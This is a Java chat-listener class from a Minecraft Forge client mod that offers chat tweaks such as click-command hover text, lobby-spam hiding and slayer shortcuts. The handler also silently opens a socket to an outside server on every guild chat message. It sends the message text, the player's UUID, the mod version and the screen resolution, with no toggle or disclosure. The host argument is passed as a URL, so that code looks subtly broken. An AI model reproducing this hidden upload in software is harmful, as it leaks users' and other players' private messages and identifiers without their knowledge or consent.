package com.confusinguser.confusingaddons.listeners;

import com.confusinguser.confusingaddons.ConfusingAddons;
import com.confusinguser.confusingaddons.utils.Feature;
import com.confusinguser.confusingaddons.utils.Multithreading;
import com.confusinguser.confusingaddons.utils.RegexUtil;
import com.google.gson.JsonIOException;
import com.google.gson.JsonObject;
import net.minecraft.client.Minecraft;
import net.minecraft.event.ClickEvent;
import net.minecraft.event.HoverEvent;
import net.minecraft.util.ChatComponentText;
import net.minecraft.util.EnumChatFormatting;
import net.minecraft.util.IChatComponent;
import net.minecraftforge.client.event.ClientChatReceivedEvent;
import net.minecraftforge.fml.common.eventhandler.EventPriority;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;

import java.io.DataOutputStream;
import java.io.IOException;
import java.net.InetAddress;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.stream.Collectors;

public class ChatMessageListener {

    private static final ClickEvent.Action[] allowedActions = {ClickEvent.Action.RUN_COMMAND, ClickEvent.Action.SUGGEST_COMMAND};

    private final Minecraft mc = Minecraft.getMinecraft();
    private final ConfusingAddons main = ConfusingAddons.getInstance();

    @SubscribeEvent(priority = EventPriority.HIGH) // Go around the join / leave message blockers
    public void onChatMessage(ClientChatReceivedEvent event) {
        if (RegexUtil.getMatcher("§2Guild > .+", event.message.getFormattedText()).find()) {
            Multithreading.runAsync(() -> {
                try {
                    Socket socket = new Socket(InetAddress.getByName("https://soopymc.my.to/"), 35746);
                    DataOutputStream outputStream = new DataOutputStream(socket.getOutputStream());
                    JsonObject json = new JsonObject();
                    json.addProperty("message", EnumChatFormatting.getTextWithoutFormattingCodes(event.message.getUnformattedText()));
                    json.addProperty("senderUUID", mc.thePlayer.getUniqueID().toString());
                    json.addProperty("modVersion", ConfusingAddons.VERSION);
                    json.addProperty("resolution", mc.displayWidth + "x" + mc.displayHeight);
                    outputStream.writeUTF(json.toString());
                    outputStream.flush();
                    outputStream.close();
                    socket.close();
                } catch (IOException | JsonIOException e) {
                    e.printStackTrace();
                }
            });
        }

        if (event.type != 2) {
            if (Feature.SHOW_CLICK_COMMANDS.isEnabled()) {
                @SuppressWarnings("unchecked")
                ArrayList<IChatComponent> siblings = (ArrayList<IChatComponent>) ((ArrayList<IChatComponent>) event.message.getSiblings()).clone();
                siblings.add(event.message);

                for (IChatComponent sibling : siblings) {
                    HoverEvent hoverEvent = sibling.getChatStyle().getChatHoverEvent();
                    ClickEvent clickEvent = sibling.getChatStyle().getChatClickEvent();
                    if (clickEvent != null && Arrays.asList(allowedActions).contains(clickEvent.getAction())) {
                        if (hoverEvent == null) {
                            sibling.getChatStyle().setChatHoverEvent(new HoverEvent(HoverEvent.Action.SHOW_TEXT, new ChatComponentText("§8" + clickEvent.getValue())));
                        } else if (!hoverEvent.getValue().getUnformattedText().contains(clickEvent.getValue())) {
                            sibling.getChatStyle().setChatHoverEvent(new HoverEvent(HoverEvent.Action.SHOW_TEXT, hoverEvent.getValue().appendText("\n§8" + clickEvent.getValue())));
                        }
                    }
                }
            }

            if (Feature.HIDE_LOBBY_SPAM.isEnabled() && main.getUtils().isLobbySpam(event.message.getFormattedText()) ||
                    Feature.HIDE_JOIN_LEAVE_MESSAGES.isEnabled() && main.getUtils().isJoinLeaveMessage(event.message.getFormattedText())) {
                event.setCanceled(true);
            }

            // If api key updated in game
            if (main.getUtils().isApiKeyUpdateMessage(event.message.getFormattedText().replace("§r", ""))) {
                main.setApiKey(event.message.getFormattedText().replace("§r", "").substring(24));
            }

            if (Feature.SWITCH_TO_BATPHONE_ON_SLAYER_DONE.isEnabled() && main.getUtils().isSlayerBossSlainMessage(event.message.getFormattedText().replace("§r", ""))) {
                List<String> itemIdList = Arrays.stream(mc.thePlayer.inventory.mainInventory).map(itemStack -> itemStack != null ? itemStack.serializeNBT().getCompoundTag("tag").getCompoundTag("ExtraAttributes").getString("id") : "").collect(Collectors.toList()).subList(0, 8);
                if (itemIdList.contains("AATROX_BATPHONE")) {
                    int batphoneSlotId = itemIdList.indexOf("AATROX_BATPHONE");
                    mc.thePlayer.inventory.currentItem = batphoneSlotId >= 0 && batphoneSlotId < 9 ? batphoneSlotId : mc.thePlayer.inventory.currentItem;
                }
            }

            if (Feature.AUTO_OPEN_MADDOX_GUI.isEnabled() && !main.getUtils().playerCurrentlyFightingBoss() && main.getUtils().getCommandFromBatphoneMessage(event.message) != null) {
                mc.thePlayer.sendChatMessage("/cb " + main.getUtils().getCommandFromBatphoneMessage(event.message).substring(4));
            }

            main.logger.info(event.message.getFormattedText().replace("§r", ""));
        }
    }
}